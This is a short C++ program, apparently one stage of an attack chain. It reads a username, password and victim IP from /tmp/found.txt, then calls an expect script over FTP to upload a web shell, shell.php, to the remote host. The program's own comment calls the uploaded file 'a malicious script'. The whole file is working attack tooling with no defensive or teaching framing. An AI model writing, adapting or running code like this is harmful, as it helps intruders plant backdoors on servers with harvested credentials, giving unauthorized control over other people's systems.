#include <iostream>
#include <string>
#include <fstream>

/* Reads a username, a password and an ip address from a file, it will use them to upload a malicious script to the remote host */
int main(){
    std::string shell = "shell.php";
    std::ifstream info("/tmp/found.txt");
    std::string usr_psw;
    getline(info,usr_psw);
    info.close();
    std::string user = usr_psw.substr(0,usr_psw.find(":"));
    usr_psw = usr_psw.substr(usr_psw.find(":")+1, usr_psw.length());
    std::string pass = usr_psw.substr(0,usr_psw.find(":"));
    std::string victim = usr_psw.substr(usr_psw.rfind(":")+1,usr_psw.length());
    std::string command = "/tmp/ftp_put.exp "+user+" "+pass+" "+victim+" "+shell;
    return system(command.c_str());
}